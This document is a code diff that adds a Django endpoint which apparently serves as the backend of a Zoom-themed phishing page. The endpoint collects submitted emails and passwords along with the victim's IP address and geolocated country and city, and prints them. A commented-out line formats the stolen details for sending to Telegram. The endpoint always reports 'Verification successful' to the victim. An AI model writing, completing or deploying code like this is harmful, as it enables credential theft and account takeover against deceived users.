@@ -72,3 +72,25 @@ def verify_user(request):
         return JsonResponse({"status": "success", "message": "Verification successful"})
 
     return JsonResponse({"status": "error", "message": "Invalid request"}, status=400)
+
+@csrf_exempt  # disable CSRF only if necessary for testing
+def verify(request):
+    if request.method == "POST":
+        # name = request.POST.get("name")
+        email = request.POST.get("email")
+        passw = request.POST.get("password")
+     
+        ip_address = request.META.get("REMOTE_ADDR")
+        country, city = get_country_from_ip(ip_address)
+        subject = 'New zoom details submitted'
+        # mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword: {passw}\npassword1: {pass1}\npassword2: {pass2}"
+
+        # send_to_telegram(mail_message)
+        print(email,passw,ip_address)
+        
+        # Add your logic here (e.g., validate credentials)
+        
+        # Example response
+        return JsonResponse({"status": "success", "message": "Verification successful"})
+
+    return JsonResponse({"status": "error", "message": "Invalid request"}, status=400)
